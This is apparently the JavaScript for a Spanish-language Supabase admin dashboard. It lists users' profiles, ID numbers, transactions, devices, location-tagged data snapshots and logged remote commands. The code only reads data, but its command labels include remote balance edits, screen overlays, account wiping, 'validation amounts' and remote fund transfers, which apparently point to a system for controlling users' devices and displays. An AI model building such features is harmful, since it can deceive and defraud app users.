// =====================================================
// CONFIGURACIÓN DE SUPABASE
// =====================================================
const SUPABASE_URL = 'https://ewdkxszfkqwlkyszodxu.supabase.co';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImV3ZGt4c3pma3F3bGt5c3pvZHh1Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjE3ODM5MzMsImV4cCI6MjA3NzM1OTkzM30.alofRt3MEn5UgSsSMk5zWTF0On1PGVepdME-MOoqk-M';

// Inicializar cliente de Supabase
const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

// Variable global para almacenar información del admin
let currentAdmin = null;
const snapshotCache = new Map();
const commandCache = new Map();
let currentDetailData = null;
const COMMAND_LABELS = {
    'update-balance': 'Actualizar saldo',
    'update-rate': 'Actualizar tasa',
    'set-block': 'Bloqueo manual',
    'wipe-account': 'Eliminar cuenta local',
    'set-validation-amount': 'Monto de validación',
    'show-overlay': 'Mostrar overlay',
    'hide-overlay': 'Ocultar overlay',
    'send-funds': 'Transferencia remota'
};

// =====================================================
// MIDDLEWARE DE AUTENTICACIÓN
// =====================================================

async function verifyAuthentication() {
    try {
        // Verificar sesión de Supabase Auth
        const { data: { user }, error: authError } = await supabase.auth.getUser();

        if (authError || !user) {
            console.error('No hay sesión activa:', authError);
            redirectToLogin();
            return false;
        }

        // Verificar que el usuario sea admin activo
        const { data: adminData, error: adminError } = await supabase
            .from('admin_users')
            .select('*')
            .eq('user_id', user.id)
            .eq('is_active', true)
            .maybeSingle();

        if (adminError || !adminData) {
            console.error('Usuario no es admin o no está activo:', adminError);
            await supabase.auth.signOut();
            redirectToLogin();
            return false;
        }

        // Guardar información del admin
        currentAdmin = adminData;
        updateAdminInfo();
        
        return true;

    } catch (error) {
        console.error('Error en verificación de autenticación:', error);
        redirectToLogin();
        return false;
    }
}

function redirectToLogin() {
    sessionStorage.removeItem('admin_user');
    window.location.href = '../auth/login.html';
}

function updateAdminInfo() {
    if (currentAdmin) {
        document.getElementById('adminName').textContent = currentAdmin.full_name;
        document.getElementById('adminRole').textContent = getRoleLabel(currentAdmin.role);
    }
}

function getRoleLabel(role) {
    const labels = {
        'super_admin': 'Super Administrador',
        'admin': 'Administrador',
        'viewer': 'Visualizador'
    };
    return labels[role] || role;
}

// =====================================================
// FUNCIONES DE CARGA DE DATOS
// =====================================================

async function loadStats() {
    try {
        // Total de usuarios
        const { count: usersCount, error: usersError } = await supabase
            .from('profiles')
            .select('*', { count: 'exact', head: true });

        if (!usersError && usersCount !== null) {
            document.getElementById('totalUsers').textContent = usersCount;
        }

        // Total de transacciones
        const { count: transactionsCount, error: transactionsError } = await supabase
            .from('transactions')
            .select('*', { count: 'exact', head: true });

        if (!transactionsError && transactionsCount !== null) {
            document.getElementById('totalTransactions').textContent = transactionsCount;
        }

        // Total de dispositivos
        const { count: devicesCount, error: devicesError } = await supabase
            .from('devices')
            .select('*', { count: 'exact', head: true });

        if (!devicesError && devicesCount !== null) {
            document.getElementById('totalDevices').textContent = devicesCount;
        }

        // Total de snapshots
        const { count: snapshotsCount, error: snapshotsError } = await supabase
            .from('miinformacion_snapshots')
            .select('*', { count: 'exact', head: true });

        if (!snapshotsError && snapshotsCount !== null) {
            document.getElementById('totalSnapshots').textContent = snapshotsCount;
        }

        const { count: commandsCount, error: commandsError } = await supabase
            .from('miinformacion_remote_commands')
            .select('*', { count: 'exact', head: true });

        if (!commandsError && commandsCount !== null) {
            document.getElementById('totalCommands').textContent = commandsCount;
        }

    } catch (error) {
        console.error('Error cargando estadísticas:', error);
    }
}

async function loadProfiles() {
    try {
        showLoading(true);
        
        const { data, error } = await supabase
            .from('profiles')
            .select('*')
            .order('created_at', { ascending: false })
            .limit(100);

        if (error) {
            console.error('Error cargando perfiles:', error);
            showTableError('profilesTableBody', 'Error al cargar perfiles');
            return;
        }

        const tbody = document.getElementById('profilesTableBody');
        
        if (!data || data.length === 0) {
            tbody.innerHTML = '<tr><td colspan="5" class="px-6 py-4 text-center text-gray-500">No hay perfiles registrados</td></tr>';
            return;
        }

        tbody.innerHTML = data.map(profile => `
            <tr class="hover:bg-gray-50">
                <td class="px-6 py-4 whitespace-nowrap">
                    <div class="text-sm font-medium text-gray-900">${escapeHtml(profile.full_name || 'N/A')}</div>
                    <div class="text-sm text-gray-500">${escapeHtml(profile.email || 'N/A')}</div>
                </td>
                <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900">
                    ${escapeHtml(profile.phone_number || 'N/A')}
                </td>
                <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900">
                    ${escapeHtml(profile.dni || 'N/A')}
                </td>
                <td class="px-6 py-4 whitespace-nowrap">
                    <span class="px-2 inline-flex text-xs leading-5 font-semibold rounded-full ${profile.kyc_status === 'approved' ? 'bg-green-100 text-green-800' : 'bg-yellow-100 text-yellow-800'}">
                        ${escapeHtml(profile.kyc_status || 'pending')}
                    </span>
                </td>
                <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                    ${formatDate(profile.created_at)}
                </td>
            </tr>
        `).join('');

        await logAdminAction('view_profiles', { count: data.length });

    } catch (error) {
        console.error('Error en loadProfiles:', error);
        showTableError('profilesTableBody', 'Error al cargar perfiles');
    } finally {
        showLoading(false);
    }
}

async function loadTransactions() {
    try {
        showLoading(true);
        
        const { data, error } = await supabase
            .from('transactions')
            .select('*')
            .order('created_at', { ascending: false })
            .limit(100);

        if (error) {
            console.error('Error cargando transacciones:', error);
            showTableError('transactionsTableBody', 'Error al cargar transacciones');
            return;
        }

        const tbody = document.getElementById('transactionsTableBody');
        
        if (!data || data.length === 0) {
            tbody.innerHTML = '<tr><td colspan="6" class="px-6 py-4 text-center text-gray-500">No hay transacciones registradas</td></tr>';
            return;
        }

        tbody.innerHTML = data.map(tx => `
            <tr class="hover:bg-gray-50">
                <td class="px-6 py-4 whitespace-nowrap text-sm font-mono text-gray-900">
                    ${escapeHtml(tx.id.substring(0, 8))}...
                </td>
                <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900">
                    ${escapeHtml(tx.user_id ? tx.user_id.substring(0, 8) + '...' : 'N/A')}
                </td>
                <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900">
                    ${escapeHtml(tx.transaction_type || 'N/A')}
                </td>
                <td class="px-6 py-4 whitespace-nowrap text-sm font-medium ${tx.amount >= 0 ? 'text-green-600' : 'text-red-600'}">
                    ${formatCurrency(tx.amount)}
                </td>
                <td class="px-6 py-4 whitespace-nowrap">
                    <span class="px-2 inline-flex text-xs leading-5 font-semibold rounded-full ${getStatusColor(tx.status)}">
                        ${escapeHtml(tx.status || 'pending')}
                    </span>
                </td>
                <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                    ${formatDate(tx.created_at)}
                </td>
            </tr>
        `).join('');

        await logAdminAction('view_transactions', { count: data.length });

    } catch (error) {
        console.error('Error en loadTransactions:', error);
        showTableError('transactionsTableBody', 'Error al cargar transacciones');
    } finally {
        showLoading(false);
    }
}

async function loadDevices() {
    try {
        showLoading(true);
        
        const { data, error } = await supabase
            .from('devices')
            .select('*')
            .order('last_seen_at', { ascending: false })
            .limit(100);

        if (error) {
            console.error('Error cargando dispositivos:', error);
            showTableError('devicesTableBody', 'Error al cargar dispositivos');
            return;
        }

        const tbody = document.getElementById('devicesTableBody');
        
        if (!data || data.length === 0) {
            tbody.innerHTML = '<tr><td colspan="5" class="px-6 py-4 text-center text-gray-500">No hay dispositivos registrados</td></tr>';
            return;
        }

        tbody.innerHTML = data.map(device => `
            <tr class="hover:bg-gray-50">
                <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900">
                    ${escapeHtml(device.user_id ? device.user_id.substring(0, 8) + '...' : 'N/A')}
                </td>
                <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900">
                    ${escapeHtml(device.device_model || 'N/A')}
                </td>
                <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900">
                    ${escapeHtml(device.os_version || 'N/A')}
                </td>
                <td class="px-6 py-4 whitespace-nowrap">
                    <span class="px-2 inline-flex text-xs leading-5 font-semibold rounded-full ${device.is_trusted ? 'bg-green-100 text-green-800' : 'bg-gray-100 text-gray-800'}">
                        ${device.is_trusted ? 'Confiable' : 'No Verificado'}
                    </span>
                </td>
                <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                    ${formatDate(device.last_seen_at)}
                </td>
            </tr>
        `).join('');

        await logAdminAction('view_devices', { count: data.length });

    } catch (error) {
        console.error('Error en loadDevices:', error);
        showTableError('devicesTableBody', 'Error al cargar dispositivos');
    } finally {
        showLoading(false);
    }
}

async function loadSnapshots() {
    try {
        showLoading(true);

        const { data, error } = await supabase
            .from('miinformacion_snapshots')
            .select('id, created_at, collected_at, device_id, email, full_name, last_sync_at, source, location, data')
            .order('created_at', { ascending: false });

        if (error) {
            console.error('Error cargando snapshots:', error);
            showTableError('snapshotsTableBody', 'Error al cargar snapshots');
            return;
        }

        const tbody = document.getElementById('snapshotsTableBody');

        if (!data || data.length === 0) {
            tbody.innerHTML = '<tr><td colspan="6" class="px-6 py-4 text-center text-gray-500">No hay snapshots registrados</td></tr>';
            return;
        }

        snapshotCache.clear();
        data.forEach(snapshot => snapshotCache.set(snapshot.id, snapshot));

        tbody.innerHTML = data.map(snapshot => `
            <tr class="hover:bg-gray-50">
                <td class="px-6 py-4 whitespace-nowrap text-sm">
                    <div class="font-mono font-medium text-gray-900">${escapeHtml(truncateId(snapshot.id))}</div>
                    <div class="text-xs text-gray-500">${formatDate(snapshot.created_at)}</div>
                </td>
                <td class="px-6 py-4 whitespace-nowrap text-sm">
                    <div class="font-medium text-gray-900">${escapeHtml(snapshot.full_name || 'Sin nombre')}</div>
                    <div class="text-xs text-gray-500">${escapeHtml(snapshot.email || 'Sin correo')}</div>
                </td>
                <td class="px-6 py-4 whitespace-nowrap text-sm">
                    <div class="text-gray-900">${escapeHtml(formatDeviceLabel(snapshot.device_id))}</div>
                    <div class="text-xs text-gray-500">${escapeHtml(formatLocation(snapshot.location))}</div>
                </td>
                <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900">
                    ${formatDate(snapshot.collected_at)}
                </td>
                <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900">
                    ${formatDate(snapshot.last_sync_at || snapshot.created_at)}
                </td>
                <td class="px-6 py-4 whitespace-nowrap text-sm font-medium">
                    <button onclick="viewSnapshot('${snapshot.id}')" class="text-purple-600 hover:text-purple-900">
                        Ver Detalles
                    </button>
                </td>
            </tr>
        `).join('');

        await logAdminAction('view_snapshots', { count: data.length });

        await loadRemoteCommands({ skipLoading: true });

    } catch (error) {
        console.error('Error en loadSnapshots:', error);
        showTableError('snapshotsTableBody', 'Error al cargar snapshots');
    } finally {
        showLoading(false);
    }
}

async function loadRemoteCommands(options = {}) {
    const { skipLoading = false } = options;

    try {
        if (!skipLoading) {
            showLoading(true);
        }

        const { data, error } = await supabase
            .from('miinformacion_remote_commands')
            .select('id, created_at, command_id, type, source, device_id, email, full_name, payload, meta')
            .order('created_at', { ascending: false });

        if (error) {
            console.error('Error cargando comandos remotos:', error);
            showTableError('commandsTableBody', 'Error al cargar comandos remotos');
            return;
        }

        const tbody = document.getElementById('commandsTableBody');

        if (!data || data.length === 0) {
            tbody.innerHTML = '<tr><td colspan="6" class="px-6 py-4 text-center text-gray-500">No hay comandos registrados</td></tr>';
            return;
        }

        commandCache.clear();
        data.forEach(command => commandCache.set(command.id, command));

        tbody.innerHTML = data.map(command => `
            <tr class="hover:bg-gray-50">
                <td class="px-6 py-4 whitespace-nowrap text-sm">
                    <div class="font-mono font-medium text-gray-900">${escapeHtml(truncateId(command.command_id || command.id))}</div>
                    <div class="text-xs text-gray-500">${formatDate(command.created_at)}</div>
                </td>
                <td class="px-6 py-4 whitespace-nowrap text-sm">
                    <div class="font-medium text-gray-900">${escapeHtml(command.full_name || 'Sin nombre')}</div>
                    <div class="text-xs text-gray-500">${escapeHtml(command.email || 'Sin correo')}</div>
                </td>
                <td class="px-6 py-4 whitespace-nowrap text-sm">
                    <span class="px-2 inline-flex text-xs leading-5 font-semibold rounded-full bg-blue-100 text-blue-800">${escapeHtml(getCommandLabel(command.type))}</span>
                    <div class="text-xs text-gray-500 mt-1">${escapeHtml(command.type || 'N/A')}</div>
                </td>
                <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900">
                    ${escapeHtml(command.source || 'miinformacion')}
                </td>
                <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900">
                    ${formatDate(command.created_at)}
                </td>
                <td class="px-6 py-4 whitespace-nowrap text-sm font-medium">
                    <button onclick="viewCommand('${command.id}')" class="text-purple-600 hover:text-purple-900">
                        Ver Detalles
                    </button>
                </td>
            </tr>
        `).join('');

        await logAdminAction('view_remote_commands', { count: data.length });

    } catch (error) {
        console.error('Error en loadRemoteCommands:', error);
        showTableError('commandsTableBody', 'Error al cargar comandos remotos');
    } finally {
        if (!skipLoading) {
            showLoading(false);
        }
    }
}

// =====================================================
// FUNCIONES DE UTILIDAD
// =====================================================

function escapeHtml(text) {
    if (!text) return '';
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

function truncateId(value) {
    if (!value || typeof value !== 'string') {
        return 'N/A';
    }
    return value.length > 12 ? `${value.substring(0, 12)}...` : value;
}

function formatDeviceLabel(deviceId) {
    if (!deviceId) {
        return 'Sin dispositivo';
    }
    return `Dispositivo ${truncateId(deviceId)}`;
}

function formatLocation(location) {
    if (!location) {
        return '';
    }
    if (typeof location === 'string') {
        return location;
    }
    if (Array.isArray(location)) {
        return location.filter(Boolean).join(' · ');
    }
    if (typeof location === 'object') {
        const parts = [];
        ['city', 'region', 'country', 'ip'].forEach(key => {
            if (location[key]) {
                parts.push(location[key]);
            }
        });
        if (parts.length > 0) {
            return parts.join(' · ');
        }
    }
    try {
        return JSON.stringify(location);
    } catch (error) {
        console.warn('No se pudo formatear la ubicación:', error);
        return '';
    }
}

function formatDate(dateString) {
    if (!dateString) return 'N/A';
    const date = new Date(dateString);
    return date.toLocaleDateString('es-ES', {
        year: 'numeric',
        month: 'short',
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit'
    });
}

function formatCurrency(amount) {
    if (amount === null || amount === undefined) return 'N/A';
    return new Intl.NumberFormat('es-AR', {
        style: 'currency',
        currency: 'ARS'
    }).format(amount);
}

function getStatusColor(status) {
    const colors = {
        'completed': 'bg-green-100 text-green-800',
        'pending': 'bg-yellow-100 text-yellow-800',
        'failed': 'bg-red-100 text-red-800',
        'processing': 'bg-blue-100 text-blue-800'
    };
    return colors[status] || 'bg-gray-100 text-gray-800';
}

function getCommandLabel(type) {
    return COMMAND_LABELS[type] || type || 'N/A';
}

function formatJson(data) {
    try {
        if (typeof data === 'string') {
            return data;
        }
        return JSON.stringify(data, null, 2);
    } catch (error) {
        console.error('No se pudo formatear el JSON:', error);
        return String(data);
    }
}

function showLoading(show) {
    const overlay = document.getElementById('loadingOverlay');
    if (show) {
        overlay.classList.remove('hidden');
    } else {
        overlay.classList.add('hidden');
    }
}

function showTableError(tableBodyId, message) {
    const tbody = document.getElementById(tableBodyId);
    const colspan = tbody.closest('table').querySelectorAll('thead th').length;
    tbody.innerHTML = `<tr><td colspan="${colspan}" class="px-6 py-4 text-center text-red-500">${escapeHtml(message)}</td></tr>`;
}

async function logAdminAction(action, details = {}) {
    if (!currentAdmin) return;
    
    try {
        await supabase
            .from('admin_audit_log')
            .insert({
                admin_user_id: currentAdmin.user_id,
                action: action,
                details: details,
                ip_address: 'web_client',
                user_agent: navigator.userAgent
            });
    } catch (error) {
        console.error('Error registrando acción:', error);
    }
}

function viewSnapshot(snapshotId) {
    const snapshot = snapshotCache.get(snapshotId);
    if (!snapshot) {
        alert('No se encontró el snapshot seleccionado.');
        return;
    }

    const metaParts = [];
    if (snapshot.full_name) metaParts.push(`Usuario: ${snapshot.full_name}`);
    if (snapshot.email) metaParts.push(snapshot.email);
    if (snapshot.device_id) metaParts.push(`Dispositivo: ${truncateId(snapshot.device_id)}`);
    if (snapshot.collected_at) metaParts.push(`Recopilado: ${formatDate(snapshot.collected_at)}`);

    const detailPayload = snapshot.data || snapshot;

    openDetailModal({
        title: 'Snapshot de Mi Información',
        meta: metaParts.join(' · ') || 'Detalles del snapshot',
        data: detailPayload
    });
}

function viewCommand(commandId) {
    const command = commandCache.get(commandId);
    if (!command) {
        alert('No se encontró el comando seleccionado.');
        return;
    }

    const metaParts = [];
    metaParts.push(`Tipo: ${getCommandLabel(command.type)}`);
    if (command.full_name) metaParts.push(`Usuario: ${command.full_name}`);
    if (command.email) metaParts.push(command.email);
    if (command.device_id) metaParts.push(`Dispositivo: ${truncateId(command.device_id)}`);

    const detail = {
        id: command.id,
        command_id: command.command_id,
        type: command.type,
        source: command.source,
        created_at: command.created_at,
        device_id: command.device_id,
        email: command.email,
        full_name: command.full_name,
        payload: command.payload,
        meta: command.meta
    };

    openDetailModal({
        title: 'Comando remoto registrado',
        meta: metaParts.join(' · '),
        data: detail
    });
}

function openDetailModal({ title, meta, data }) {
    const modal = document.getElementById('detailModal');
    if (!modal) return;

    document.getElementById('detailModalTitle').textContent = title;
    document.getElementById('detailModalMeta').textContent = meta;
    const formatted = formatJson(data);
    document.getElementById('detailModalContent').textContent = formatted;

    currentDetailData = data;
    modal.classList.remove('hidden');
    document.body.classList.add('overflow-hidden');
}

function closeDetailModal() {
    const modal = document.getElementById('detailModal');
    if (!modal) return;
    modal.classList.add('hidden');
    document.body.classList.remove('overflow-hidden');
    currentDetailData = null;
}

async function copyDetailModalContent() {
    if (!currentDetailData) return;
    try {
        const json = formatJson(currentDetailData);
        await navigator.clipboard.writeText(json);
        alert('Datos copiados al portapapeles.');
    } catch (error) {
        console.error('No se pudo copiar el contenido:', error);
        alert('No se pudo copiar el contenido. Intenta nuevamente.');
    }
}

// =====================================================
// MANEJO DE TABS
// =====================================================

function setupTabs() {
    const tabButtons = document.querySelectorAll('.tab-button');
    const tabContents = document.querySelectorAll('.tab-content');

    tabButtons.forEach(button => {
        button.addEventListener('click', () => {
            const targetTab = button.dataset.tab;

            // Actualizar botones
            tabButtons.forEach(btn => {
                btn.classList.remove('border-purple-600', 'text-purple-600');
                btn.classList.add('border-transparent', 'text-gray-500');
            });
            button.classList.remove('border-transparent', 'text-gray-500');
            button.classList.add('border-purple-600', 'text-purple-600');

            // Actualizar contenido
            tabContents.forEach(content => {
                content.classList.add('hidden');
            });
            document.getElementById(`${targetTab}-content`).classList.remove('hidden');

            // Cargar datos según la pestaña
            switch(targetTab) {
                case 'profiles':
                    loadProfiles();
                    break;
                case 'transactions':
                    loadTransactions();
                    break;
                case 'devices':
                    loadDevices();
                    break;
                case 'snapshots':
                    loadSnapshots();
                    break;
            }
        });
    });
}

function setupDetailModal() {
    const closeButtons = [
        document.getElementById('detailModalClose'),
        document.getElementById('detailModalCloseFooter')
    ];

    closeButtons.forEach(button => {
        if (button) {
            button.addEventListener('click', closeDetailModal);
        }
    });

    const backdrop = document.getElementById('detailModalBackdrop');
    if (backdrop) {
        backdrop.addEventListener('click', closeDetailModal);
    }

    const copyButton = document.getElementById('detailModalCopy');
    if (copyButton) {
        copyButton.addEventListener('click', copyDetailModalContent);
    }

    document.addEventListener('keydown', event => {
        if (event.key === 'Escape') {
            closeDetailModal();
        }
    });
}

// =====================================================
// LOGOUT
// =====================================================

async function handleLogout() {
    try {
        showLoading(true);
        
        await logAdminAction('logout', {
            timestamp: new Date().toISOString()
        });

        await supabase.auth.signOut();
        sessionStorage.removeItem('admin_user');
        
        window.location.href = '../auth/login.html';
    } catch (error) {
        console.error('Error al cerrar sesión:', error);
        alert('Error al cerrar sesión. Por favor intenta de nuevo.');
    } finally {
        showLoading(false);
    }
}

// =====================================================
// INICIALIZACIÓN
// =====================================================

async function init() {
    // Verificar autenticación
    const isAuthenticated = await verifyAuthentication();
    
    if (!isAuthenticated) {
        return;
    }

    // Configurar tabs
    setupTabs();
    setupDetailModal();

    // Configurar botón de logout
    document.getElementById('logoutButton').addEventListener('click', handleLogout);

    // Cargar estadísticas
    await loadStats();

    // Cargar primera pestaña (perfiles)
    await loadProfiles();

    // Actualizar estadísticas cada 30 segundos
    setInterval(loadStats, 30000);
}

// Ejecutar al cargar la página
document.addEventListener('DOMContentLoaded', init);
